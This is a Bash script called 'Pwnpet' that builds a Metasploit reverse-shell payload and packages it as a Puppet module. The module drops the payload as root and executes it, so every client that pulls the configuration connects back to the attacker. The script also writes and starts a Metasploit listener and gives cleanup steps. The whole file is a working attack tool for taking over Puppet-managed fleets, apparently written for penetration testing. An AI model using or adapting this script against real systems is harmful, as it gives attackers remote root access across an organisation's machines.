#!/bin/bash

#   Useful MSF Commands:
#	msfvenom --list payloads
#	msfvenom --list encoders
#	msfvenom --help-formats
#
#   You will need metasploit framework installed obviously

echo "+-------------------------------------------------------------------------+"
echo "|				    Pwnpet					|"
echo "|	     The payload generator to pwn a puppet infrastructure using msf	|"
echo "|http://n0tty.github.io/2017/06/11/Enterprise-Offense-IT-Operations-Part-1|"
echo "+-------------------------------------------------------------------------+"
echo "|	  		     Author: Tanoy 'n0tty' Bose				|"
echo "+-------------------------------------------------------------------------+"
echo ""

function helpUsage {
echo "Usage: ./pwnpet.sh <metasploit payload> <type of binary> <attacker ip> <attacker port> <output directory>"
echo "Example: ./pwnpet.sh linux/x86/meterpreter_reverse_http elf 192.168.56.1 80 puppetPwner"
}


function createPayload {
echo "Creating Puppet Payloads..."
mkdir -p ${5}/modules/my_file/files/
mkdir -p ${5}/modules/my_file/manifests/
mkdir -p ${5}/manifests/
msfvenom -p ${1} -f ${2} lhost=${3} lport=${4} > ${5}/modules/my_file/files/payload
echo -e "node 'puppetclient' {\ninclude my_file\n}" > ${5}/manifests/site.pp
echo -e "class my_file {\nfile{ '/tmp/payload':\nensure => present,\nsource => 'puppet:///modules/my_file/payload',\nowner  => root,\ngroup  => root,\nmode   => '0777',\n}\nexec {'reverse shell':\ncommand => '/tmp/payload'\n}\n}" > ${5}/modules/my_file/manifests/init.pp
}

function msfResourceScriptCreator {
echo "Creating metasploit resource script"
touch /tmp/pwnpet.rc
echo use exploit/multi/handler >> /tmp/pwnpet.rc
echo set PAYLOAD ${1} >> /tmp/pwnpet.rc
echo set LHOST 0.0.0.0 >> /tmp/pwnpet.rc
echo set LPORT ${2} >> /tmp/pwnpet.rc
echo set ExitOnSession false >> /tmp/pwnpet.rc
echo exploit -j -z >> /tmp/pwnpet.rc
touch /tmp/msfpuppet.sh
echo "#!/bin/bash" >> /tmp/msfpuppet.sh
echo "service postgresql start" >> /tmp/msfpuppet.sh
echo "msfconsole -r /tmp/pwnpet.rc" >> /tmp/msfpuppet.sh
chmod +x /tmp/msfpuppet.sh
echo "Launching Metasploit session"
gnome-terminal -e "bash -c \"/tmp/msfpuppet.sh; exec bash\""
}

function finalInstructions {
echo "Read http://n0tty.github.io/Enterprise-Offense-Puppet-Pwnage before running this script on your client environment"
echo "Instructions:"
echo "Copy the contents of the folder "${1}" into the puppet folder w.r.t the puppet directory structure"
echo "Wait for the puppet clients that pull these configurations to connect to your metasploit server and create session"
echo "For puppet client cleanup, delete the /tmp/payload file"
echo "For puppet server cleanup, delete all the items added by you"
sleep 20
echo "Initiating local cleanup..."
rm /tmp/msfpuppet.sh
rm /tmp/pwnpet.rc
echo "Local system cleanup complete"
echo "Remember to delete folder "${1}" from your local system, once your activity has been completed"

}

if [ -z ${1} ] & [ -z ${2} ] & [ -z ${3} ] & [ -z ${4} ] & [ -z ${5} ];
then
	helpUsage
else
	createPayload ${1} ${2} ${3} ${4} ${5}
	msfResourceScriptCreator ${1} ${4}
	finalInstructions ${5}
fi

